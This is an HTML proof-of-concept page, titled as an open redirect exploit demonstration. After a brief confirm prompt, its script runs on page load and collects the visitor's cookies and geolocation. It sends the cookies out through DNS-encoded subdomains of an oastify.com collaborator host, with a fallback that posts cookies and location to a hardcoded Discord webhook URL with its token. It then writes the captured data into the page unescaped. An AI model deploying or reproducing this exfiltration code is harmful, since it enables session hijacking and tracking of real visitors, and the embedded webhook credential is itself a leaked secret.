<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Redirect Exploit</title>
    <style>
        @keyframes glitch {
            0% {
                clip: rect(24px, 9999px, 44px, 0);
            }
            20% {
                clip: rect(67px, 9999px, 17px, 0);
            }
            40% {
                clip: rect(45px, 9999px, 25px, 0);
            }
            60% {
                clip: rect(76px, 9999px, 63px, 0);
            }
            80% {
                clip: rect(47px, 9999px, 33px, 0);
            }
            100% {
                clip: rect(87px, 9999px, 54px, 0);
            }
        }
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h1, p {
            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #0f0;
            position: relative;
            display: inline-block;
            animation: glitch 1s infinite;
        }
        .container {
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid #0f0;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px #0f0;
            text-align: center;
        }
        .glitch::before {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 2px;
            text-shadow: -2px 0 #ff00c1;
            clip: rect(24px, 550px, 90px, 0);
            animation: glitch 2s infinite;
        }
        .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: -2px;
            text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1;
            clip: rect(85px, 550px, 140px, 0);
            animation: glitch 3s infinite;
        }
        @keyframes glitch {
            0% {
                clip: rect(42px, 9999px, 44px, 0);
                transform: skew(0.3deg);
            }
            5% {
                clip: rect(15px, 9999px, 56px, 0);
                transform: skew(0.1deg);
            }
            10% {
                clip: rect(85px, 9999px, 38px, 0);
                transform: skew(0.1deg);
            }
            15% {
                clip: rect(55px, 9999px, 50px, 0);
                transform: skew(0.1deg);
            }
            20% {
                clip: rect(75px, 9999px, 42px, 0);
                transform: skew(0.3deg);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="glitch" data-text="Open Redirect Exploit Demonstration">Open Redirect Exploit Demonstration</h1>
        <p>This page demonstrates the impact of an open redirect vulnerability.</p>
        <audio id="glitch-sound" src="https://www.soundjay.com/button/sounds/button-16.mp3" preload="auto"></audio>
    </div>
    <script>
        // Function to play glitch sound
        function playGlitchSound() {
            document.getElementById('glitch-sound').play();
        }

        // Function to show disclaimer and get user consent
        function showDisclaimer() {
            return new Promise((resolve) => {
                playGlitchSound();
                const disclaimer = 'This site is demonstrating an open redirect vulnerability. If you proceed, we will capture your cookies and location information. Do you want to continue?';
                resolve(confirm(disclaimer));
            });
        }

        // Function to get user location
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    }, error => {
                        reject(error);
                    });
                } else {
                    reject('Geolocation not supported');
                }
            });
        }

        // Function to encode data for DNS query
        function encodeForDNS(data) {
            return data.split('').map(char => char.charCodeAt(0).toString(36)).join('.');
        }

        // Function to capture and log sensitive information
        async function captureSensitiveInfo() {
            const consent = await showDisclaimer();
            if (!consent) {
                document.body.innerHTML = '<h1>User did not consent to data capture</h1>';
                return;
            }

            // Capture all cookies
            const cookies = document.cookie;

            // Capture user location
            let location = 'Location not available';
            try {
                location = await getLocation();
            } catch (error) {
                console.error('Error getting location:', error);
            }

            // Encode cookies for DNS query
            const encodedCookies = encodeForDNS(cookies);
            const dnsQueryURL = `https://${encodedCookies}.457hobfrmi9aspzlmkeop7oo5fb6zz3ns.oastify.com`;

            // Send DNS query
            try {
                await fetch(dnsQueryURL);
            } catch (dnsError) {
                console.error('DNS server is down, sending data to Discord webhook.');

                // Send captured information to Discord webhook
                fetch('https://discordapp.com/api/webhooks/1099806912956088412/iejfzOQx5u4EcV-Gba7Ki1zV_Y7ERIOTFM6HnQPXHPJ5kGbRPDYWjq3KcrEaTQXyEUze', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `**Cookies:** ${cookies}\n**Location:** ${JSON.stringify(location)}`,
                        username: 'Notify Bot',
                        avatar_url: 'https://path-to-avatar-image.png'
                    })
                }).then(response => {
                    console.log('Sensitive information sent to Discord webhook:', response.status);
                }).catch(webhookError => {
                    console.error('Error sending sensitive information to Discord webhook:', webhookError);
                });
            }

            // Display captured information to the user
            document.body.innerHTML = `
                <h1 class="glitch" data-text="Captured Information">Captured Information</h1>
                <p><strong>Cookies:</strong> ${cookies}</p>
                <p><strong>Location:</strong> ${JSON.stringify(location)}</p>
            `;
        }

        // Capture sensitive information on page load
        window.onload = captureSensitiveInfo;
    </script>
</body>
</html>

